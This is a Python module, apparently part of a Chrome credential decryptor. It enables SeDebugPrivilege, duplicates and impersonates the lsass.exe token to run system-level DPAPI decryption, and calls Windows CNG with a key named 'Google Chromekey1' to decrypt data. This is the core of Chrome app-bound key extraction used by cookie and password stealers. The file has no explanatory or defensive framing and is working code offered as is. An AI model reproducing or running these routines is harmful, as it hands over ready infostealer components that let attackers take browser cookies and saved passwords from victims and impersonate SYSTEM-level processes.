import ctypes
from contextlib import contextmanager
import windows
import windows.crypto
import windows.generated_def as gdef


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


def dpapi_unprotect(data, system=False):
    if system:
        with impersonate_lsass():
            return windows.crypto.dpapi.unprotect(data)
    return windows.crypto.dpapi.unprotect(data)


def decrypt_with_cng(data, key_name="Google Chromekey1"):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
    
    hKey = gdef.NCRYPT_KEY_HANDLE()
    ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(data)).from_buffer_copy(data)
    
    ncrypt.NCryptDecrypt(hKey, input_buffer, len(data), None, None, 0, ctypes.byref(pcbResult), 0x40)
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    ncrypt.NCryptDecrypt(hKey, input_buffer, len(data), None, output_buffer, pcbResult.value, ctypes.byref(pcbResult), 0x40)
    
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    
    return bytes(output_buffer[:pcbResult.value])
